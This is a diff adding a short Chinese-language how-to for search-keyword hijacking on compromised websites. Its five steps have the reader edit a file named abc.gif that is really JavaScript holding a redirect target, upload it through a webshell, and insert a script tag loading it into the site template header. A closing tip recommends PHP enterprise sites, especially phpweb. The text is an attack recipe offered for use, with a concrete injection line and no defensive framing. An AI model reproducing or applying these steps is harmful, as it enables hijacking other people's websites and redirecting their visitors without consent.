@@ -1,0 +1,17 @@
+第一步：打开浏览器搜索想要劫持的关键词，获取编码
+%E8%8B%8F%E5%AD%9C%E9%98%BF%E7%94%AB%E7%89%87
+
+第二步：然后打开abc.gif，改编码和要跳转到的网站
+
+第三步：上传abc.gif上传到webshell
+
+第四步：<script type="text/javascript" src="/news/pics/20130918/abc.gif"></script>
+
+第五步：把这段代码插入模板文件夹（templates）的头部文件（header）里面。
+
+
+
+
+
+
+注意：要php程序的企业站，最好是phpweb程序。
